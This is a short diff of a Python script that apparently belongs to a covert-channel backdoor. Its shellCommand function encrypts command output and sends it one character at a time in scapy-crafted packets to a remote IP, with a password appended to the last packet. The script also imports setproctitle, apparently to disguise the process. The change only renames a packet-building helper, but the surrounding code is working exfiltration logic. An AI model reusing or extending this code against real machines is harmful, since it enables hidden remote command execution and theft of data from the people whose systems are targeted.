@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import logging, setproctitle, triplesec, encryption, configfile, packetFunctions, helpers
+import logging, setproctitle, triplesec, encryption, configfile, helpers
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
@@ -58,7 +58,7 @@ def shellCommand(packet, command):
     encryptedData = encryption.encrypt(output, configfile.password)
     lastIndex = len(encryptedData) - 1
     for index, char in enumerate(encryptedData):
-        packet = packetFunctions.createPacketOne(configfile.protocol, ip, char)
+        packet = helpers.createPacket(configfile.protocol, ip, char)
         if index == lastIndex:
             packet = packet/Raw(load=configfile.password)
         send(packet, verbose=0)
